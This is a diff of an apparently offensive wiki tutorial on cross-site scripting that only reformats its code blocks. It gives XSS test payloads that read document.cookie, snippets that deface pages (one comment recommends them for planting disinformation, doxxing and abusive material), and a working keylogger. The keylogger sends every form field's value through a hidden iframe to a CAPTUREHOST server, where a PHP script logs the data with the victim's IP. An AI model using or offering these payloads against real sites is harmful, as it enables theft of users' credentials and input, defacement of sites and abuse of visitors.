@@ -3,14 +3,15 @@ Cross site scripting (or XSS) is a method of exploiting a website that does not 
 ## Entrypoints ##
 
 XSS entrypoints are usually found in webforms & querystrings. You can test for the existence of xss by using the following string.
-<pre><script>alert(document.cookie);</script></pre>
+
+`<script>alert(document.cookie);</script>`
 
 You also may be able to include javascript embedded in a flash object, or an image like so:
-<pre><img src="javascript:alert(document,cookie);" /></pre>
+```<img src="javascript:alert(document,cookie);" />```
 
 But this varies between browsers.
 Another way is like this
-<pre><a href="javascript:alert(document.cookie);">link</a></pre>
+```<a href="javascript:alert(document.cookie);">link</a>```
 
 But this requires your target to click a link
 
@@ -30,53 +31,53 @@ Remember to always read up on the latest security news. Not long ago, someone fi
 
 ## Sample Code ##
 
-<pre>//---Javascript
+```//---Javascript
 //Overlay a black background with LOL in big white text
 html='<div style="position:absolute;top:0px;left:0px;z-index:99;width:100%;height:100%;background-color:black;"><h1 style="color:#fff;">LOLHAI</h1></div>';
-document.write(html);</pre>
+document.write(html);```
 
-<pre>//---Javascript
+```//---Javascript
 //Change the content of <body>
 html='<h1>LOLHAI</h1>';
-window.document.body.innerHTML=html;</pre>
+window.document.body.innerHTML=html;```
 
-<pre>//---Javascript
+```//---Javascript
 //You can study the structure of a site and change the content for any element ID or tag name
 html='<h1>LOLHAI</h1>';
 document.getElementById('element_id').innerHTML = html;
 document.getElementsByTagName('element_tag')[child].innerHTML = html;
-//This is epic for trolling by inserting typos, disinformation, dox, gore, cp, etc</pre>
+//This is epic for trolling by inserting typos, disinformation, dox, gore, cp, etc```
 
-<pre>//---Javascript
+```//---Javascript
 //This is an example of a keylogger. There is also a php file on this article you can use to capture the data.
 randVal = 'loldongs'+(Math.round((10000-5000) * Math.random() + 5000));
 wp='<div style=":display:block;width:0;height:0;z-index:0;overflow:hidden;" id="'+randVal+'"></div>';
 window.onload=function(){
-	window.document.body.innerHTML='<div onkeyup="kl();">'+window.document.body.innerHTML+wp+'</div>';
+        window.document.body.innerHTML='<div onkeyup="kl();">'+window.document.body.innerHTML+wp+'</div>';
 }
 function kl(){
-	inp=document.getElementsByTagName('input');
-	qs='';
-	for(var i = 0; i < inp.length; i++){
-		qs=qs+i+'_'+inp[i].name+'='+inp[i].value+'&';
-	}
-	cn=document.getElementById(randVal);
-	kf='<iframe style="width:0;height:0;" src="http://CAPTUREHOST/capture.php?'+qs+'"></iframe>';
-	cn.innerHTML=kf;
-}</pre>
+        inp=document.getElementsByTagName('input');
+        qs='';
+        for(var i = 0; i < inp.length; i++){
+                qs=qs+i+'_'+inp[i].name+'='+inp[i].value+'&';
+        }
+        cn=document.getElementById(randVal);
+        kf='<iframe style="width:0;height:0;" src="http://CAPTUREHOST/capture.php?'+qs+'"></iframe>';
+        cn.innerHTML=kf;
+}```
 
-<pre>//---capture.php
+```//---capture.php
 //This will catch all data passed as querystrings and save them in a readable format with IP, referrer & timestamp 
 <?php
-	$dumpFile = "dump";
-	$fh = fopen($dumpFile, 'a') or die("can't open file");
-	fwrite($fh, date("m/d/y_g:i:s").'|'.$_SERVER['REMOTE_ADDR'].'|'.$_SERVER['HTTP_REFERER'].'|');
-	foreach($_GET as $qs => $val){
-		fwrite($fh, $qs."=".$val.'|');
-	}
-	fwrite($fh, "\n");
-	fclose($fh);
-?></pre>
+        $dumpFile = "dump";
+        $fh = fopen($dumpFile, 'a') or die("can't open file");
+        fwrite($fh, date("m/d/y_g:i:s").'|'.$_SERVER['REMOTE_ADDR'].'|'.$_SERVER['HTTP_REFERER'].'|');
+        foreach($_GET as $qs => $val){
+                fwrite($fh, $qs."=".$val.'|');
+        }
+        fwrite($fh, "\n");
+        fclose($fh);
+?>```
 
 {{tutorials}}
 
